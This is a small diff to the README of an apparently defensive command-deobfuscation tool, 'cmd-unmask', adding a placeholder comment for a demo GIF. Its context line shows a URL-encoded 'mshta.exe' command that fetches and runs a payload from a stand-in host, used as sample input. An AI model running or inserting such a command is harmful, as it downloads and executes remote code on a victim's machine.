@@ -95,6 +95,8 @@ echo "mshta.exe http%3A%2F%2Fevil.example%2Fpayload.hta" | cmd-unmask --format j
 
 ## 🖥️ Live Terminal Output
 
+<!-- demo.gif goes here after recording -->
+
 By default (`--format pretty`), `cmd-unmask` renders a 4-part operator view with human-readable transformation steps and a borderless Section `[4]` designed for direct terminal highlight-and-copy:
 
 ```text
